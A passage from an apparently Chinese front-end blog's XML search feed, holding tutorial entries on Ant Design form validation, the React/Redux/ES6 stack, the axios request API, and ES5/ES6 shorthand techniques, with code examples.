&amp;&amp; values.length&gt;0)&#123; values.map((value,i)=&gt;&#123; if(value.name.length &gt; 16 )&#123; callback(`第$&#123;i+1&#125;个标签超过16个字符`); &#125;else if(value.name.length == 0)&#123; callback(`第$&#123;i+1&#125;个标签不能为空`); &#125;else&#123; callback(); &#125; &#125;); &#125;else&#123; callback(); &#125; &#125; &#125;], &#125;)( &lt;MyTag /&gt; )&#125;&lt;/FormItem&gt;至此可以删除addTag中的验证代码了]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>Ant Design</tag>
        <tag>Ant Design自定义组件验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React技术栈整理]]></title>
    <url>%2F2017%2F10%2F27%2FReact%E6%8A%80%E6%9C%AF%E6%A0%88%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[这里梳理下React技术栈需要的最小知识集，让你可以最短时间掌握React,Redux,React-Router,ES6的相关知识，更快的上手React”全家桶“。预计会有ES6、React、Redux、React-Router、Webpack，实时更新目录。ES6知识变量声明let 和 const不要用var，而是用let 和 const 。const声明一个只读的常量，let用来声明变量，const 和 let 都是块级作用域。1234const PLUS = 'PLUS';let availableId = 0;availableId ++;模板字符串模板字符串（template string）是增强版的字符串，用反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。12345678const user = 'world';console.log(`hello $&#123;user&#125;`); // hello world// 多行（所有的空格和缩进都会被保留在输出之中）const content = ` Hello $&#123;firstName&#125;, Thanks for ordering $&#123;qty&#125; tickets to $&#123;event&#125;.`;默认参数12345function log(user = 'World') &#123; console.log(user);&#125;log() // World箭头函数ES6 允许使用“箭头”（=&gt;）定义函数。函数的快捷写法，不需要通过 function 关键字创建函数，并且还可以省略 return 关键字。同时，箭头函数还会继承当前上下文的 this 关键字，即：函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。123456789101112131415161718// ES6function Timer() &#123; this.s1 = 0; setInterval(() =&gt; this.s1++, 1000);&#125;// 等同于ES5function Timer() &#123; this.s1 = 0; setInterval((function () &#123; this.s1++; &#125;).bind(this), 1000);&#125;const timer = new Timer();setTimeout(() =&gt; console.log('s1: ', timer.s1), 3100); // s1:3模块的 Import 和 Exportimport 用于引入模块，export 用于导出模块。12345678910111213141516//导出默认, counter.jsexport default function counter() &#123; // ...&#125;import counter from 'counter'; // 普通导出和导入，reducer.jsexport const injectReducer = ( ) =&gt; &#123; //...&#125;import &#123; injectReducer &#125; from 'reducers'// 引入全部并作为 reducers 对象import * as reducers from './reducers';对象和数组解构赋值1234567// 数组let [a, b, c] = [1, 2, 3];a // 1//对象let &#123; foo, bar &#125; = &#123; foo: "aaa", bar: "bbb" &#125;;foo // "aaa"函数的参数也可以使用解构赋值。12345function add ([x, y]) &#123; return x + y;&#125;add([1, 2]); // 3从作为函数实参的对象中提取数据12345678910111213141516171819function userId(&#123;id&#125;) &#123; return id;&#125;function whois(&#123;displayName: displayName, fullName: &#123;firstName: name&#125;&#125;)&#123; console.log(displayName + " is " + name);&#125;var user = &#123; id: 42, displayName: "jdoe", fullName: &#123; firstName: "John", lastName: "Doe" &#125;&#125;;console.log("userId: " + userId(user)); // "userId: 42"whois(user); // "jdoe is John"属性的简洁表示法123456const foo = 'bar';const baz = &#123;foo&#125;;baz // &#123;foo: "bar"&#125;// 等同于const baz = &#123;foo: foo&#125;;除了属性简写，方法也可以简写。12345678910111213const o = &#123; method() &#123; return "Hello!"; &#125;&#125;;// 等同于const o = &#123; method: function() &#123; return "Hello!"; &#125;&#125;;扩展运算符扩展运算符（spread）是三个点（…）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。组装数组123const a = [1, 2];const b = [...a, 3];b // [1,2,3]获取数组部分1234567const arr = ['a', 'b', 'c'];const [first, ...rest] = arr;rest; // ['b', 'c']// With ignoreconst [first, , ...rest] = arr;rest; // ['c']还可收集函数参数为数组。1234function directions(first, ...rest) &#123; console.log(rest);&#125;directions('a', 'b', 'c'); // ['b', 'c'];代替 apply。123456function foo(x, y, z) &#123;&#125;const args = [1,2,3];// 下面两句效果相同foo.apply(null, args);foo(...args);组装对象123const a = &#123; x : 1, y : 2 &#125;const b = &#123; ...a, z : 3 &#125;b // &#123;x:1, y: 2, z: 3&#125;PromisePromise 用于更优雅地处理异步请求。比如发起异步请求：1234fetch('/api/todos') .then(res =&gt; res.json()) .then(data =&gt; (&#123; data &#125;)) .catch(err =&gt; (&#123; err &#125;));定义 Promise 。123456789const delay = (timeout) =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(resolve, timeout); &#125;);&#125;;delay(1000).then(() =&gt; &#123; console.log('executed');&#125;);React知识JSX1const element = &lt;h1&gt;Hello, world!&lt;/h1&gt;;在 JSX 中使用表达式你可以任意地在 JSX 当中使用 JavaScript 表达式，在 JSX 当中的表达式要包含在大括号里。1&lt;h1&gt;&#123;title&#125;&lt;/h1&gt;JSX 嵌套如果 JSX 标签是闭合式的，那么你需要在结尾处用 /&gt;, 就好像 XML/HTML 一样：1const element = &lt;img src=&#123;user.avatarUrl&#125; /&gt;;互相嵌套123456const element = ( &lt;div&gt; &lt;h1&gt;Hello!&lt;/h1&gt; &lt;h2&gt;Good to see you here.&lt;/h2&gt; &lt;/div&gt;);classNameclass 是保留词，所以添加样式时，需用 className 代替 class 。1&lt;h1 className="loading"&gt;Hello world&lt;/h1&gt;Mapping Arrays to JSX12345&lt;div&gt; &#123;text.map(item =&gt; ( &lt;p key=&#123;item.id&#125;&gt;&#123;item.text&#125;&lt;/p&gt; ))&#125;&lt;/div&gt;React组件3种形式分别是 React.createClass, class 和 Stateless Functional Component（无状态组件）。推荐尽量使用最后一种，保持简洁和无状态。这是函数，不是 Object，没有 this 作用域，是 pure function。createClass12345678910var MyComponent = React.createClass(&#123; componentWillMount: function()&#123; &#125;, render: function() &#123; return ( &lt;div&gt;ES5&lt;/div&gt; ); &#125;,&#125;);createClass写法是React官方反对的，会在React v15.*短期保留，在v16.0版本会被移除。stateless function12345const MyComponent = () =&gt; ( &lt;div&gt; ES6 &lt;/div&gt;);class1234567class MyComponent extends React.Component &#123; render() &#123; return ( &lt;div&gt;ES6&lt;/div&gt; ); &#125;&#125;PropTypes使用PropTypes检查propsES6写法12345678910111213141516import Proptypes from 'prop-types'class Video extends React.Component &#123; render() &#123; return ( &lt;View /&gt; ); &#125;&#125;Video.defaultProps = &#123; autoPlay: false, maxLoops: 10,&#125;;Video.propTypes = &#123; autoPlay: PropTypes.bool.isRequired, maxLoops: PropTypes.number.isRequired&#125;;ES 试验特性写法：static是类的静态属性，不会被实例继承12345678910111213class Video extends React.Component &#123; static defaultProps = &#123; autoPlay: false, maxLoops: 10, &#125; static propTypes = &#123; autoPlay: PropTypes.bool.isRequired, maxLoops: PropTypes.number.isRequired &#125; state = &#123; loopsRemaining: this.props.maxLoops, &#125;&#125;StateinitialState的设定应放在constructor中12345678export default class Header extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; title: props.title &#125;; &#125;&#125;也可以按照ES 试验特性写法1234567export default class Header extends Component &#123; state = &#123; title: this.props.title &#125;; // followed by constructor...&#125;destructuring &amp; spread attributes123456789101112131415161718192021class AutoloadingPostsGrid extends React.Component &#123; render() &#123; const &#123; className, ...others, // contains all properties of this.props except for className &#125; = this.props; return ( &lt;div className=&#123;className&#125;&gt; &lt;PostsGrid &#123;...others&#125; /&gt; &lt;button onClick=&#123;this.handleLoadMoreClick&#125;&gt;Load more&lt;/button&gt; &lt;/div&gt; ); &#125;&#125;// with arrow functionconst App = (&#123;className, ...rest&#125;) =&gt; ( &lt;div className=&#123;classnames(className)&#125; &#123;...rest&#125;&gt; &lt;MyComponent /&gt; &lt;/div&gt;);React组件生命周期counstruct方法的作用：设置初始state或者绑定方法，在其他任何表达式前应调用super(props)1234567891011constructor(props) &#123; super(props); this.state = &#123; color: props.initialColor &#125;; this.logger.bind(this)&#125;logger () &#123; console.log('hello world')&#125;super(props)：super方法提供this给其他表达式引用，提供props给其他表达式调用。this.logger.bind(this)用来绑定this。可用箭头函数结合ES7的静态属性替代123logger = () =&gt; &#123; console.log('hello')&#125;commentDidMount方法内可以设置state,触发组件更新重渲。React数据向上和向下传递展示Redux知识React Redux 数据流通过这张流程图，我们可以更好的理解Redux和React直接数据如何流通，关系如何映射。让我们一步步来了解图中的各个概念。action &amp; actionCreatoraction creator 就是函数而已,负责构建一个 action （是的，action creator 这个名字已经很明显了）并返回它。通过几行简单的代码就可以解释清楚了！12345const actionCreator = function () &#123; return &#123; type : 'AN_ACTION' &#125;&#125;一般约定 action 是一个拥有 type 属性的对象。12console.log(actionCreator())// &#123; type: 'AN_ACTION' &#125;reducerReducer 函数只是一个纯函数，它接收应用程序的当前状态以及发生的 action，然后返回修改后的新状态（或者有人称之为归并后的状态）。Reducer 函数是 action 的订阅者。12345const reducer = function (state = &#123;&#125;, action) &#123; console.log('reducer was called with state', state, 'and action', action); return state;&#125;Store以上，action描述“发生了什么”，而reducer根据action来更新state。但是他们两者之间是如何关联的呢？不用担心，Redux 会帮你把action和reducer连接起来。我们把 Redux实例称为store 并用以下方式创建：123import &#123; createStore &#125; from 'redux'const store_0 = createStore(() =&gt; &#123;&#125;)注意：在createStore时，需要给它传入一个 reducer 函数。每当一个action发生时，Redux都能调用这个函数。往 createStore 传 Reducer 的过程就是给 Redux绑定 action处理函数（也就是Reducer）的过程。接下来，试着在 Reducer 中打印一些 log123456const reducer = function (...args) &#123; console.log('Reducer was called with args', args)&#125;const store_1 = createStore(reducer)// 输出：Reducer was called with args [ undefined, &#123; type: '@@redux/INIT' &#125; ]我们没有dispatch(分发)任何action，但是reducer被调用了！这是由于初始化应用state的时候，Redux dispatch 了一个初始化的 action ({ type: ‘@@redux/INIT’ })。reducer的入参为(state, action)。state还没有被初始化，自然为undefined。如何读取store中的state?Redux为我们提供了store.getState()方法。12345678910111213import &#123; createStore &#125; from 'redux'const reducer_2 = function (state = &#123;&#125;, action) &#123; console.log('reducer_2 was called with state', state, 'and action', action) return state;&#125;const store_2 = createStore(reducer_2)// 输出: reducer_2 was called with state &#123;&#125; and action &#123; type: '@@redux/INIT' &#125;console.log('store_2 state after initialization:', store_2.getState())// 输出: store_2 state after initialization: &#123;&#125;如何dispatch action?我们需要使用store.dispatch(action)方法。123456// 接以上代码const anAction = &#123; type : 'AN_ACTION'&#125;store_2.dispatch(anAction);// 输出：reducer_2 was called with state &#123;&#125; and action &#123; type: 'AN_ACTION' &#125;combineReducerscombineReducer用于合并Reducers，并且合并对应的State。12345678910111213141516171819202122232425262728293031323334353637383940const userReducer = function (state = &#123;&#125;, action) &#123; console.log('userReducer was called with state', state, 'and action', action) switch (action.type) &#123; // etc. default: return state; &#125;&#125;const itemsReducer = function (state = [], action) &#123; console.log('itemsReducer was called with state', state, 'and action', action) switch (action.type) &#123; // etc. default: return state; &#125;&#125;import &#123; createStore, combineReducers &#125; from 'redux'const reducer = combineReducers(&#123; user : userReducer, items : itemsReducer&#125;)// 输出：// userReducer was called with state &#123;&#125; and action &#123; type: '@@redux/INIT' &#125;// userReducer was called with state &#123;&#125; and action &#123; type: '@@redux/PROBE_UNKNOWN_ACTION_9.r.k.r.i.c.n.m.i' &#125;// itemsReducer was called with state [] and action &#123; type: '@@redux/INIT' &#125;// itemsReducer was called with state [] and action &#123; type: '@@redux/PROBE_UNKNOWN_ACTION_4.f.i.z.l.3.7.s.y.v.i' &#125;var store_0 = createStore(reducer)// 输出：// userReducer was called with state &#123;&#125; and action &#123; type: '@@redux/INIT' &#125;// itemsReducer was called with state [] and action &#123; type: '@@redux/INIT' &#125;console.log('store_0 state after initialization:', store_0.getState())// 输出：// store_0 state after initialization: &#123; user: &#123;&#125;, items: [] &#125;回过头来看看文章开头的数据流向图View组件通过click等事件，dispatch一个(actionCreator返回的)action，通过Store把当前状态state和action传递给订阅者reducer函数,reducer返回一个新的状态存储在Store中，Store又把新的State传递给View组件触发组件更新。为了将Redux和React联系到一起。就需要用到React-Redux这个库。12import &#123; connect &#125; from 'react-redux'const containerComponent = connect(mapStateToProps, mapDispatchToProps)(presentationalComponent)简单来说，mapStateToProps和mapDispatchToProps就是分别把Redux的state,和dispatch(action)映射到React组件中作为props。connect将展示组件(presentationalComponent)封装成高阶的容器组件(containerComponent)。state的更新意味着props更新。React脚手架构图最后贴一张react脚手架架构图以作备用。]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>Reactjs</tag>
        <tag>React技术栈整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[axios使用详解]]></title>
    <url>%2F2017%2F10%2F27%2Faxios%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[一、安装1、 利用npm安装npm install axios --save2、 利用bower安装bower install axios --save3、 直接利用cdn引入&lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;二、例子1、 发送一个GET请求1234567891011121314151617181920//通过给定的ID来发送请求axios.get('/user?ID=12345') .then(function(response)&#123; console.log(response); &#125;) .catch(function(err)&#123; console.log(err); &#125;);//以上请求也可以通过这种方式来发送axios.get('/user',&#123; params:&#123; ID:12345 &#125;&#125;).then(function(response)&#123; console.log(response);&#125;).catch(function(err)&#123; console.log(err);&#125;);2、 发送一个POST请求12345678910axios.post('/user',&#123; firstName:'Fred', lastName:'Flintstone'&#125;).then(function(res)&#123; console.log(res);&#125;).catch(function(err)&#123; console.log(err);&#125;);3、 一次性并发多个请求12345678910function getUserAccount()&#123; return axios.get('/user/12345');&#125;function getUserPermissions()&#123; return axios.get('/user/12345/permissions');&#125;axios.all([getUserAccount(),getUserPermissions()]) .then(axios.spread(function(acct,perms)&#123; //当这两个请求都完成的时候会触发这个函数，两个参数分别代表返回的结果 &#125;))三、axios的API（一）axios可以通过配置（config）来发送请求1、 axios(config)123456789//发送一个`POST`请求axios(&#123; method:"POST", url:'/user/12345', data:&#123; firstName:"Fred", lastName:"Flintstone" &#125;&#125;);2、 axios(url[,config])12//发送一个`GET`请求（默认的请求方式）axios('/user/12345');（二）请求方式的别名，这里对所有已经支持的请求方式都提供了方便的别名12345678910111213axios.request(config);axios.get(url[,config]);axios.delete(url[,config]);axios.head(url[,config]);axios.post(url[,data[,config]]);axios.put(url[,data[,config]])axios.patch(url[,data[,config]])注意：当我们在使用别名方法的时候，url,method,data这几个参数不需要在配置中声明（三）并发请求（concurrency）,即是帮助处理并发请求的辅助函数1234//iterable是一个可以迭代的参数如数组等axios.all(iterable)//callback要等到所有请求都完成才会执行axios.spread(callback)（四）创建一个axios实例，并且可以自定义其配置1、 axios.create([config])12345var instance = axios.create(&#123; baseURL:"https://some-domain.com/api/", timeout:1000, headers: &#123;'X-Custom-Header':'foobar'&#125;&#125;);2、 实例的方法一下是实例方法，注意已经定义的配置将和利用create创建的实例的配置合并12345678910111213axios#request(config)axios#get(url[,config])axios#delete(url[,config])axios#head(url[,config])axios#post(url[,data[,config]])axios#put(url[,data[,config]])axios#patch(url[,data[,config]])四、请求的配置（request config）以下就是请求的配置选项，只有url选项是必须的，如果method选项未定义，那么它默认是以GET的方式发出请求123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&#123; //`url`是请求的服务器地址 url:'/user', //`method`是请求资源的方式 method:'get'//default //如果`url`不是绝对地址，那么`baseURL`将会加到`url`的前面 //当`url`是相对地址的时候，设置`baseURL`会非常的方便 baseURL:'https://some-domain.com/api/', //`transformRequest`选项允许我们在请求发送到服务器之前对请求的数据做出一些改动 //该选项只适用于以下请求方式：`put/post/patch` //数组里面的最后一个函数必须返回一个字符串、-一个`ArrayBuffer`或者`Stream` transformRequest:[function(data)&#123; //在这里根据自己的需求改变数据 return data; &#125;], //`transformResponse`选项允许我们在数据传送到`then/catch`方法之前对数据进行改动 transformResponse:[function(data)&#123; //在这里根据自己的需求改变数据 return data; &#125;], //`headers`选项是需要被发送的自定义请求头信息 headers: &#123;'X-Requested-With':'XMLHttpRequest'&#125;, //`params`选项是要随请求一起发送的请求参数----一般链接在URL后面 //他的类型必须是一个纯对象或者是URLSearchParams对象 params: &#123; ID:12345 &#125;, //`paramsSerializer`是一个可选的函数，起作用是让参数（params）序列化 //例如(https://www.npmjs.com/package/qs,http://api.jquery.com/jquery.param) paramsSerializer: function(params)&#123; return Qs.stringify(params,&#123;arrayFormat:'brackets'&#125;) &#125;, //`data`选项是作为一个请求体而需要被发送的数据 //该选项只适用于方法：`put/post/patch` //当没有设置`transformRequest`选项时dada必须是以下几种类型之一 //string/plain/object/ArrayBuffer/ArrayBufferView/URLSearchParams //仅仅浏览器：FormData/File/Bold //仅node:Stream data &#123; firstName:"Fred" &#125;, //`timeout`选项定义了请求发出的延迟毫秒数 //如果请求花费的时间超过延迟的时间，那么请求会被终止 timeout:1000, //`withCredentails`选项表明了是否是跨域请求 withCredentials:false,//default //`adapter`适配器选项允许自定义处理请求，这会使得测试变得方便 //返回一个promise,并提供验证返回 adapter: function(config)&#123; /*..........*/ &#125;, //`auth`表明HTTP基础的认证应该被使用，并提供证书 //这会设置一个authorization头（header）,并覆盖你在header设置的Authorization头信息 auth: &#123; username:"zhangsan", password: "s00sdkf" &#125;, //返回数据的格式 //其可选项是arraybuffer,blob,document,json,text,stream responseType:'json',//default // xsrfCookieName: 'XSRF-TOKEN',//default xsrfHeaderName:'X-XSRF-TOKEN',//default //`onUploadProgress`上传进度事件 onUploadProgress:function(progressEvent)&#123; //下载进度的事件onDownloadProgress:function(progressEvent)&#123;&#125; &#125;, //相应内容的最大值 maxContentLength:2000, //`validateStatus`定义了是否根据http相应状态码，来resolve或者reject promise //如果`validateStatus`返回true(或者设置为`null`或者`undefined`),那么promise的状态将会是resolved,否则其状态就是rejected validateStatus:function(status)&#123; return status &gt;= 200 &amp;&amp; status &lt;300;//default &#125;, //`maxRedirects`定义了在nodejs中重定向的最大数量 maxRedirects: 5,//default //`httpAgent/httpsAgent`定义了当发送http/https请求要用到的自定义代理 //keeyAlive在选项中没有被默认激活 httpAgent: new http.Agent(&#123;keeyAlive:true&#125;), httpsAgent: new https.Agent(&#123;keeyAlive:true&#125;), //proxy定义了主机名字和端口号， //`auth`表明http基本认证应该与proxy代理链接，并提供证书 //这将会设置一个`Proxy-Authorization` header,并且会覆盖掉已经存在的`Proxy-Authorization` header proxy: &#123; host:'127.0.0.1', port: 9000, auth: &#123; username:'skda', password:'radsd' &#125; &#125;, //`cancelToken`定义了一个用于取消请求的cancel token //详见cancelation部分 cancelToken: new cancelToken(function(cancel)&#123; &#125;)&#125;五、请求返回的内容1234567891011&#123; data:&#123;&#125;, status:200, //从服务器返回的http状态文本 statusText:'OK', //响应头信息 headers: &#123;&#125;, //`config`是在请求的时候的一些配置信息 config: &#123;&#125;&#125;你可以这样来获取响应信息12345678axios.get('/user/12345') .then(function(res)&#123; console.log(res.data); console.log(res.status); console.log(res.statusText); console.log(res.headers); console.log(res.config); &#125;)六、默认配置你可以设置默认配置，对所有请求都有效1、 全局默认配置123axios.defaults.baseURL = 'http://api.exmple.com';axios.defaults.headers.common['Authorization'] = AUTH_TOKEN;axios.defaults.headers.post['content-Type'] = 'appliction/x-www-form-urlencoded';2、 自定义的实例默认设置1234567//当创建实例的时候配置默认配置var instance = axios.create(&#123; baseURL: 'https://api.example.com'&#125;);//当实例创建时候修改配置instance.defaults.headers.common["Authorization"] = AUTH_TOKEN;3、 配置中的有优先级config配置将会以优先级别来合并，顺序是lib/defauts.js中的默认配置，然后是实例中的默认配置，最后是请求中的config参数的配置，越往后等级越高，后面的会覆盖前面的例子。12345678910//创建一个实例的时候会使用libray目录中的默认配置//在这里timeout配置的值为0，来自于libray的默认值var instance = axios.create();//回覆盖掉library的默认值//现在所有的请求都要等2.5S之后才会发出instance.defaults.timeout = 2500;//这里的timeout回覆盖之前的2.5S变成5sinstance.get('/longRequest',&#123; timeout: 5000&#125;);七、拦截器你可以在请求、响应在到达then/catch之前拦截他们12345678910111213141516//添加一个请求拦截器axios.interceptors.request.use(function(config)&#123; //在请求发出之前进行一些操作 return config;&#125;,function(err)&#123; //Do something with request error return Promise.reject(error);&#125;);//添加一个响应拦截器axios.interceptors.response.use(function(res)&#123; //在这里对返回的数据进行处理 return res;&#125;,function(err)&#123; //Do something with response error return Promise.reject(error);&#125;)2、取消拦截器12var myInterceptor = axios.interceptor.request.use(function()&#123;/*....*/&#125;);axios.interceptors.request.eject(myInterceptor);3、 给自定义的axios实例添加拦截器12var instance = axios.create();instance.interceptors.request.use(function()&#123;&#125;)八、错误处理12345678910111213axios.get('/user/12345') .catch(function(error)&#123; if(error.response)&#123; //请求已经发出，但是服务器响应返回的状态吗不在2xx的范围内 console.log(error.response.data); console.log(error.response.status); console.log(error.response.header); &#125;else &#123; //一些错误是在设置请求的时候触发 console.log('Error',error.message); &#125; console.log(error.config); &#125;);九、取消你可以通过一个cancel token来取消一个请求你可以通过CancelToken.source工厂函数来创建一个cancel token123456789101112131415var CancelToken = axios.CancelToken;var source = CancelToken.source();axios.get('/user/12345',&#123; cancelToken: source.token&#125;).catch(function(thrown)&#123; if(axios.isCancel(thrown))&#123; console.log('Request canceled',thrown.message); &#125;else &#123; //handle error &#125;&#125;);//取消请求（信息的参数可以设置的）source.cance("操作被用户取消");你可以给cancelToken构造函数传递一个executor function来创建一个cancel token:12345678910var cancelToken = axios.CancelToken;var cance;axios.get('/user/12345',&#123; cancelToken: new CancelToken(function(c)&#123; //这个executor函数接受一个cancel function作为参数 cancel = c; &#125;)&#125;)//取消请求cancel();]]></content>
      <categories>
        <category>ECMAScript6</category>
      </categories>
      <tags>
        <tag>axios使用方法</tag>
        <tag>axios使用详解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES5和ES6开发中需要知道的简写技巧]]></title>
    <url>%2F2017%2F10%2F27%2FES5%E5%92%8CES6%E5%BC%80%E5%8F%91%E4%B8%AD%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84%E7%AE%80%E5%86%99%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[初级篇1、三目运算符下面是一个很好的例子，将一个完整的 if 语句，简写为一行代码。1234567const x = 20;let answer;if (x &gt; 10) &#123; answer = 'greater than 10';&#125; else &#123; answer = 'less than 10';&#125;简写为：1const answer = x &gt; 10 ? 'greater than 10' : 'less than 10';2、循环语句当使用纯 JavaScript（不依赖外部库，如 jQuery 或 lodash）时，下面的简写会非常有用。1for (let i = 0; i &lt; allImgs.length; i++)简写为：1for (let index of allImgs)下面是遍历数组 forEach 的简写示例：12345678function logArrayElements(element, index, array) &#123; console.log("a[" + index + "] = " + element);&#125;[2, 5, 9].forEach(logArrayElements);// logs:// a[0] = 2// a[1] = 5// a[2] = 93、声明变量在函数开始之前，对变量进行赋值是一种很好的习惯。在申明多个变量时：123let x;let y;let z = 3;可以简写为：1let x, y, z=3;4、if 语句在使用 if 进行基本判断时，可以省略赋值运算符。1if (likeJavaScript === true)简写为：1if (likeJavaScript)5、十进制数可以使用科学计数法来代替较大的数据，如可以将 10000000 简写为 1e7。1for (let i = 0; i &lt; 10000; i++) &#123; &#125;简写为：1for (let i = 0; i &lt; 1e7; i++) &#123; &#125;6、多行字符串如果需要在代码中编写多行字符串，就像下面这样：123456const lorem = 'Lorem ipsum dolor sit amet, consectetur\n\t' + 'adipisicing elit, sed do eiusmod tempor incididunt\n\t' + 'ut labore et dolore magna aliqua. Ut enim ad minim\n\t' + 'veniam, quis nostrud exercitation ullamco laboris\n\t' + 'nisi ut aliquip ex ea commodo consequat. Duis aute\n\t' + 'irure dolor in reprehenderit in voluptate velit esse.\n\t'但是还有一个更简单的方法，只使用引号：123456const lorem = `Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse.`高级篇1、变量赋值当将一个变量的值赋给另一个变量时，首先需要确保原值不是 null、未定义的或空值。可以通过编写一个包含多个条件的判断语句来实现：123if (variable1 !== null || variable1 !== undefined || variable1 !== '') &#123; let variable2 = variable1;&#125;或者简写为以下的形式：1const variable2 = variable1 || 'new';可以将下面的代码去自己测试：123456let variable1;let variable2 = variable1 || '';console.log(variable2 === ''); // prints truevariable1 = 'foo';variable2 = variable1 || '';console.log(variable2); // prints foo2、默认值赋值如果预期参数是 null 或未定义，则不需要写六行代码来分配默认值。我们可以只使用一个简短的逻辑运算符，只用一行代码就能完成相同的操作。123456let dbHost;if (process.env.DB_HOST) &#123; dbHost = process.env.DB_HOST;&#125; else &#123; dbHost = 'localhost';&#125;简写为：1const dbHost = process.env.DB_HOST || 'localhost';3、对象属性ES6 提供了一个很简单的办法，来分配属性的对象。如果属性名与 key 名相同，则可以使用简写。1const obj = &#123; x:x, y:y &#125;;简写为：1const obj = &#123; x, y &#125;;4、箭头函数经典函数很容易读写，但是如果把它们嵌套在其它函数中进行调用时，整个函数就会变得有些冗长和混乱。这时候可以使用箭头函数来简写：1234567891011function sayHello(name) &#123; console.log('Hello', name);&#125; setTimeout(function() &#123; console.log('Loaded')&#125;, 2000); list.forEach(function(item) &#123; console.log(item);&#125;);简写为：123sayHello = name =&gt; console.log('Hello', name);setTimeout(() =&gt; console.log('Loaded'), 2000);list.forEach(item =&gt; console.log(item));5、隐式返回值返回值是我们通常用来返回函数最终结果的关键字。只有一个语句的箭头函数，可以隐式返回结果（函数必须省略括号（{ }），以便省略返回关键字）。要返回多行语句（例如对象文本），需要使用（）而不是{ }来包裹函数体。这样可以确保代码以单个语句的形式进行求值。123function calcCircumference(diameter) &#123; return Math.PI * diameter&#125;简写为：123calcCircumference = diameter =&gt; ( Math.PI * diameter;)6、默认参数值可以使用 if 语句来定义函数参数的默认值。ES6 中规定了可以在函数声明中定义默认值。1234567function volume(l, w, h) &#123; if (w === undefined) w = 3; if (h === undefined) h = 4; return l * w * h;&#125;简写为：12volume = (l, w = 3, h = 4 ) =&gt; (l * w * h);volume(2) //output: 247、模板字符串过去我们习惯了使用“+”将多个变量转换为字符串，但是有没有更简单的方法呢？ES6 提供了相应的方法，我们可以使用反引号和 $ { } 将变量合成一个字符串。12const welcome = 'You have logged in as ' + first + ' ' + last + '.'const db = 'http://' + host + ':' + port + '/' + database;简写为：12const welcome = `You have logged in as $&#123;first&#125; $&#123;last&#125;`;const db = `http://$&#123;host&#125;:$&#123;port&#125;/$&#123;database&#125;`;8、解构赋值解构赋值是一种表达式，用于从数组或对象中快速提取属性值，并赋给定义的变量。在代码简写方面，解构赋值能达到很好的效果。12345678const observable = require('mobx/observable');const action = require('mobx/action');const runInAction = require('mobx/runInAction');const store = this.props.store;const form = this.props.form;const loading = this.props.loading;const errors = this.props.errors;const entity = this.props.entity;简写为：12import &#123; observable, action, runInAction &#125; from 'mobx';const &#123; store, form, loading, errors, entity &#125; = this.props;甚至可以指定自己的变量名：1const &#123; store, form, loading, errors, entity:contact &#125; = this.props;9、展开运算符展开运算符是在 ES6 中引入的，使用展开运算符能够让 JavaScript 代码更加有效和有趣。使用展开运算符可以替换某些数组函数。1234567// joining arraysconst odd = [1, 3, 5];const nums = [2 ,4 , 6].concat(odd); // cloning arraysconst arr = [1, 2, 3, 4];const arr2 = arr.slice( )简写为：12345678// joining arraysconst odd = [1, 3, 5 ];const nums = [2 ,4 , 6, ...odd];console.log(nums); // [ 2, 4, 6, 1, 3, 5 ] // cloning arraysconst arr = [1, 2, 3, 4];const arr2 = [...arr];和 concat( ) 功能不同的是，用户可以使用扩展运算符在任何一个数组中插入另一个数组。12const odd = [1, 3, 5 ];const nums = [2, ...odd, 4 , 6];也可以将展开运算符和 ES6 解构符号结合使用：1234const &#123; a, b, ...z &#125; = &#123; a: 1, b: 2, c: 3, d: 4 &#125;;console.log(a) // 1console.log(b) // 2console.log(z) // &#123; c: 3, d: 4 &#125;10、强制参数默认情况下，如果不向函数参数传值，那么 JavaScript 会将函数参数设置为未定义。其它一些语言则会发出警告或错误。要执行参数分配，可以使用if语句抛出未定义的错误，或者可以利用“强制参数”。123456function foo(bar) &#123; if(bar === undefined) &#123; throw new Error('Missing parameter!'); &#125; return bar;&#125;简写为：123456mandatory = ( ) =&gt; &#123; throw new Error('Missing parameter!');&#125;foo = (bar = mandatory( )) =&gt; &#123; return bar;&#125;11、Array.find如果你曾经编写过普通 JavaScript 中的 find 函数，那么你可能使用了 for 循环。在 ES6 中，介绍了一种名为 find（）的新数组函数，可以实现 for 循环的简写。123456789101112const pets = [ &#123; type: 'Dog', name: 'Max'&#125;, &#123; type: 'Cat', name: 'Karl'&#125;, &#123; type: 'Dog', name: 'Tommy'&#125;,]function findDog(name) &#123; for(let i = 0; i&lt;pets.length; ++i) &#123; if(pets[i].type === 'Dog' &amp;&amp; pets[i].name === name) &#123; return pets[i]; &#125; &#125;&#125;简写为：12pet = pets.find(pet =&gt; pet.type ==='Dog' &amp;&amp; pet.name === 'Tommy');console.log(pet); // &#123; type: 'Dog', name: 'Tommy' &#125;12、Object [key]虽然将 foo.bar 写成 foo [‘bar’] 是一种常见的做法，但是这种做法构成了编写可重用代码的基础。请考虑下面这个验证函数的简化示例：12345678function validate(values) &#123; if(!values.first) return false; if(!values.last) return false; return true;&#125;console.log(validate(&#123;first:'Bruce',last:'Wayne'&#125;)); // true上面的函数完美的完成验证工作。但是当有很多表单，则需要应用验证，此时会有不同的字段和规则。如果可以构建一个在运行时配置的通用验证函数，会是一个好选择。1234567891011121314151617181920212223// object validation rulesconst schema = &#123; 